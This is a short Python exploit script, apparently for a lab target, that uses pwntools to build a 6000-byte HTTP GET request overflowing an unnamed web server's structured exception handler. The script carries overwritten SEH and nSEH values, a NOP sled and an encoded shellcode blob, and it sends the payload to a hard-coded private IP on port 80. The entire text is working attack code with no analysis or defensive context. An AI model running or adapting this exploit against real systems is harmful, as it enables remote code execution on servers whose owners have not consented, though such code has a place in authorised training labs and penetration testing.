from pwn import *

ip = "192.168.15.172"
port = 80

cmd = "GET /"
end = " HTTP/1.1\r\n"
nSeh = 4066
Seh = 4070
new_Seh = 0x100103FE #pop pop ret
new_nSeh = 0x909006EB #jump short + nopsled

shellcode =  b"\x90"*15
shellcode += b"\xd9\xc7\xd9\x74\x24\xf4\xbb\x29\xd9\xb0\xca"
shellcode += b"\x5f\x29\xc9\xb1\x52\x83\xc7\x04\x31\x5f\x13"
shellcode += b"\x03\x76\xca\x52\x3f\x74\x04\x10\xc0\x84\xd5"
shellcode += b"\x75\x48\x61\xe4\xb5\x2e\xe2\x57\x06\x24\xa6"
shellcode += b"\x5b\xed\x68\x52\xef\x83\xa4\x55\x58\x29\x93"
shellcode += b"\x58\x59\x02\xe7\xfb\xd9\x59\x34\xdb\xe0\x91"
shellcode += b"\x49\x1a\x24\xcf\xa0\x4e\xfd\x9b\x17\x7e\x8a"
shellcode += b"\xd6\xab\xf5\xc0\xf7\xab\xea\x91\xf6\x9a\xbd"
shellcode += b"\xaa\xa0\x3c\x3c\x7e\xd9\x74\x26\x63\xe4\xcf"
shellcode += b"\xdd\x57\x92\xd1\x37\xa6\x5b\x7d\x76\x06\xae"
shellcode += b"\x7f\xbf\xa1\x51\x0a\xc9\xd1\xec\x0d\x0e\xab"
shellcode += b"\x2a\x9b\x94\x0b\xb8\x3b\x70\xad\x6d\xdd\xf3"
shellcode += b"\xa1\xda\xa9\x5b\xa6\xdd\x7e\xd0\xd2\x56\x81"
shellcode += b"\x36\x53\x2c\xa6\x92\x3f\xf6\xc7\x83\xe5\x59"
shellcode += b"\xf7\xd3\x45\x05\x5d\x98\x68\x52\xec\xc3\xe4"
shellcode += b"\x97\xdd\xfb\xf4\xbf\x56\x88\xc6\x60\xcd\x06"
shellcode += b"\x6b\xe8\xcb\xd1\x8c\xc3\xac\x4d\x73\xec\xcc"
shellcode += b"\x44\xb0\xb8\x9c\xfe\x11\xc1\x76\xfe\x9e\x14"
shellcode += b"\xd8\xae\x30\xc7\x99\x1e\xf1\xb7\x71\x74\xfe"
shellcode += b"\xe8\x62\x77\xd4\x80\x09\x82\xbf\x6e\x65\x83"
shellcode += b"\x6a\x07\x74\x9b\x85\x8b\xf1\x7d\xcf\x23\x54"
shellcode += b"\xd6\x78\xdd\xfd\xac\x19\x22\x28\xc9\x1a\xa8"
shellcode += b"\xdf\x2e\xd4\x59\x95\x3c\x81\xa9\xe0\x1e\x04"
shellcode += b"\xb5\xde\x36\xca\x24\x85\xc6\x85\x54\x12\x91"
shellcode += b"\xc2\xab\x6b\x77\xff\x92\xc5\x65\x02\x42\x2d"
shellcode += b"\x2d\xd9\xb7\xb0\xac\xac\x8c\x96\xbe\x68\x0c"
shellcode += b"\x93\xea\x24\x5b\x4d\x44\x83\x35\x3f\x3e\x5d"
shellcode += b"\xe9\xe9\xd6\x18\xc1\x29\xa0\x24\x0c\xdc\x4c"
shellcode += b"\x94\xf9\x99\x73\x19\x6e\x2e\x0c\x47\x0e\xd1"
shellcode += b"\xc7\xc3\x2e\x30\xcd\x39\xc7\xed\x84\x83\x8a"
shellcode += b"\x0d\x73\xc7\xb2\x8d\x71\xb8\x40\x8d\xf0\xbd"
shellcode += b"\x0d\x09\xe9\xcf\x1e\xfc\x0d\x63\x1e\xd5"



payload = fit({
	0:cmd,
	nSeh:new_nSeh,
	Seh:new_Seh,
	Seh+4:shellcode,
	6000-len(end):end
	}, length=6000)

print(payload)

conn = remote(ip,port)
conn.sendline(payload)